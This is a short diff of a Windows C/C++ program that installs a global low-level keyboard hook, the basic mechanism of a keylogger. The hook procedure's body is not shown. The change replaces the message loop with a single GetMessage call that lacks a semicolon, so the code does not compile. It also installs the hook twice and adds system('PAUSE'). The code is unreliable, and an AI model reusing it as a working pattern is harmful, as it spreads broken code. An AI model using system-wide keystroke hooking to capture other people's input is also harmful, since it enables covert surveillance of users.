@@ -30,9 +30,7 @@ LRESULT __stdcall HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
 void SetHook()
 {
 	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookProcedure, NULL, 0)))
-	{
 		MessageBox(NULL, L"Failed to install hook!", L"Error", MB_ICONERROR);
-	}
 }
 
 void ReleaseHook()
@@ -44,17 +42,9 @@ int main()
 {
 	SetHook();
 	MSG msg;
-	while (GetMessage(&msg, NULL, 0, 0))
-	{
-		SetHook();
-	}
+	SetHook();
+	GetMessage(&msg, NULL, 0, 0)
 	ReleaseHook();
-
+	system("PAUSE");
 	return (0);
 }
-
-
-
-
-
-
